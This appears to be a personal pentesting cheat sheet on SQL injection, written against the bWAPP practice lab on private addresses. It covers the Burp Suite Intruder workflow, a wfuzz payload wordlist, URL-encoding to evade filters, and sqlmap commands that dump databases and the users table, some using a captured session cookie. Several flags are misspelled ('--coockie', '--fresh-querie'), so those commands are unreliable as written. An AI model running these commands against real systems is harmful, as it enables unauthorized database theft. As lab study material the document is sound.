##### SQL Analogy

SQL Query:
> SELECT * FROM users WHERE name='username' and password='password'

##### Payloads

KALI: /usr/share/wordlists/wfuzz/Injections/SQL.txt || [GITHUB](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt)


### SQL (GET/Search)

Diffrent **Encoding** will work:
- Encode (  '  ) ar an URL is (  %27  ) | SQL Injection will still work

This might bypass some security checks

___

BurpSuit

1. **Identify** SQL Injection field.
2. Foxy-Proxy with BurpSuit, capture GET Request
3. right click Send to INTRUDER and remove input fields ( § ) where Not Needed
4. Load a payload in Intruder and Start

If broken an ERROR will be present in the RESPONSE

---

SQLMAP

1. **Capture** GET Request from SQL Injection field ( BurpSuite )
2.  Command Time:

URL taken from BurpSuit "GET URL" | "&action=search" is not needed -> "&"

```
$ sqlmap -u "https://192.168.1.225/bWAPP/sqli_1.php?title="
```

PHPSESID / coockie. from BurpSuite. Might be needed if loged in.

``` 
$ sqlmap -u "https://192.168.1.255/bWAPP/sqli_1.php?title=" --coockie="PHPSESSID=fb74c7cc58faf89e1fac9529a37acd5c; security_level=0" 
{--dbs | -T | -D } [ --fresh-querie ] [ --dump ]
```

--dbs = Lists Databases
-D = Select database
-T = Select table
--fresh-querie = New not localy stored querie
--dump = Give all info 

**FINAL COMMAND** ""

``` 
$ sqlmap -u "http://192.168.1.225/bWAPP/sqli_1.php?title=&action=search" --coockie="TEST" -D bWAPP -T users --dump --fresh-querie
```


### SQL (Login From/User)

sqlmap to dump sql-db
- Parameter example: **login=tom&password=123&form=submit**

Use --> login <-- "Found from BurpSuite GET Request"

1. Capture **Login** GET Request in (BurpSuite) && copy data to file
2. Find parameter to use with sqlmap
3. Commands:

```
$ sqlmap -r SQL_Burpsuit_FILE -p login --dump
```

-p = Parameter
--dump =dump all in db 